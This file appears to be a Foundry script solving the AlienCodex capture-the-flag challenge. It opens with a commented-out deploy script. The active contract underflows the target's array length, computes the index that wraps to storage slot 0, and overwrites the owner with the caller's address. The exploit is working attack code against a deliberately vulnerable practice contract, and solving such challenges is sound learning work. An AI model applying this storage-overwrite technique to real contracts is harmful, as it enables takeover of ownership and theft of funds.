// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.5.0;

// import {Script, console} from "forge-std/Script.sol";
// import {AlienCode} from "../src/AlienCode.sol";

// contract AlienCodeScript is Script {
//     AlienCode public alienCode;

//     function setUp() public {}

//     function run() public {
//         vm.startBroadcast();

//         alienCode = new AlienCode();

//         vm.stopBroadcast();
//     }
// }

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import {AlienCodex} from "../src/AlienCode.sol";
import {Script, console} from "forge-std/Script.sol";

contract AlienHack is Script{
    AlienCodex alienCode = AlienCodex(0x752dD58810d09984504e080098A0c3Cf26C9093e);

    function exploit () external {
        vm.broadcast();
        // console.log("contact", alienCode.contact);
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        alienCode.makeContact();
        alienCode.retract();
        alienCode.revise(index, myAddress);
    }
}
